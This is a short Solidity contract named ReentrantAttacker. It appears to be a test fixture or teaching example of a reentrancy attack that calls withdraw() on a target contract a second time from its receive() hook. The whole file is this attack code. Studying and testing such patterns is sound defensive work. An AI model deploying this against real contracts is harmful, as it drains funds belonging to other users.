contract ReentrantAttacker {
    C public target;
    bool private reentered;
    constructor(C _target) { target = _target; }
    function attack() external {
        target.withdraw();
    }
    receive() external payable {
        if (!reentered && address(target).balance >= target.balances(address(this))) {
            reentered = true;
            target.withdraw();
        }
    }
}

